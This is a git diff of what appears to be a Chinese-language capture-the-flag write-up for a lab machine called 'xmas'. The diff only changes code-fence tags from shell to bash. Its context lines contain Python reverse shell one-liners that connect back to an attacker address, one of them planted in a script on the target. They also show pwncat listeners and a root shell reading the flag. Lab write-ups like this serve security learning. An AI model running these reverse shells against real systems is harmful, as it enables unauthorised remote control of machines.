@@ -53,7 +53,7 @@ PORT   STATE SERVICE VERSION
 
 尝试进行目录扫描
 
-```shell
+```bash
 [10:28:15] 200 -    6KB - /images/
 [10:28:16] 200 -   22KB - /index.php
 [10:28:16] 200 -   22KB - /index.php/login/
@@ -75,7 +75,7 @@ PORT   STATE SERVICE VERSION
 
 直接反弹 shell
 
-```shell
+```bash
 # python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 8888
@@ -183,7 +183,7 @@ import pty
 pty.spawn("bash")
 ```
 
-```shell
+```bash
 (remote) www-data@xmas:/opt/NiceOrNaughty$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > nice_or_naughty.py
 ┌─[randark@parrot]─[~]
@@ -309,7 +309,7 @@ Main-Class: shell
 
 成功收到回连的shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 6666
 [18:05:08] Welcome to pwncat 🐈!
@@ -329,7 +329,7 @@ root
 
 ### flag- root
 
-```shell
+```bash
 (remote) root@xmas:/root# cat root.txt 
       __,_,_,___)          _______
     (--| | |             (--/    ),_)        ,_) 
